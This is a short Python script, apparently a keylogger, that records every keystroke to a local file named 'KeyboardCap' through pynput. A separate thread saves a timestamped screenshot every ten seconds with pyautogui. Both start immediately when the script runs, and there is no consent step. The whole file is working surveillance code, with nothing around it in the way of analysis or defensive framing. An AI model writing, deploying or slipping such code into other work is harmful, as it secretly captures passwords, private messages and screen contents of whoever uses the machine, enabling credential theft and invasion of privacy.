import pynput
import pyautogui
import re
import time
import threading


def capt(tecla):
    arq = "KeyboardCap"
    'screenshot()'
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', ' [ENTER] \n', tecla)
    tecla = re.sub(r'Key.backspace', ' [Backspace] ', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    with open(arq, "a") as a:
        a.write(tecla)


def detect():
    with pynput.keyboard.Listener(on_press=capt) as l:
        l.join()


def screenshot():
    while True:
        print("#")
        x = time.strftime('%Y-%m-%d.%H-%M-%S', time.localtime())
        Screenshot = pyautogui.screenshot()
        Screenshot.save(r'wind' + x + '.png')
        time.sleep(10)


threading.Thread(target=screenshot).start()

threading.Thread(target=detect).start()
